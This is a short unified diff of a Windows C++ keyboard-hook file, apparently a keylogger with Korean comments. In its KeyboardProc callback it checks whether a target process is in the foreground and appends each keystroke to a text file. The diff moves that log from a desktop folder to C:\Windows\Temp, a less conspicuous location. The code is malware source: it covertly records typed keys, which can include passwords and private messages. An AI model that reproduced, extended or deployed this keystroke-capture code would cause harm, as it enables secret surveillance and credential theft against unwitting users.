@@ -1,9 +1,6 @@
 #include <stdio.h>
 #include <windows.h>
 #include <fstream>
-#include <iostream>
-#include <stdlib.h>
-
 using namespace std;
 
 
@@ -60,6 +57,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     char key;
     char szPath[MAX_PATH] = {0,};
     char *p =NULL;
+    
 
     if (nCode >=0)
     {
@@ -76,9 +74,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             //_stricmp : 둘다 소문자로 바꾸어 비교
             if(!_stricmp(p+1, DEF_PROCESS_NAME)) // 같으면 0을 반환해줌 
             {
+
                 key=(char)wParam;
                 //log 저장
-                ofstream output("C:\\Users\\HP450G1\\Desktop\\coding\\keylog.txt",ios::app);
+                ofstream output("C:\\Windows\\Temp\\keylog.txt",ios::app);
                 output << key;
                 output.close();
                 // return 1;
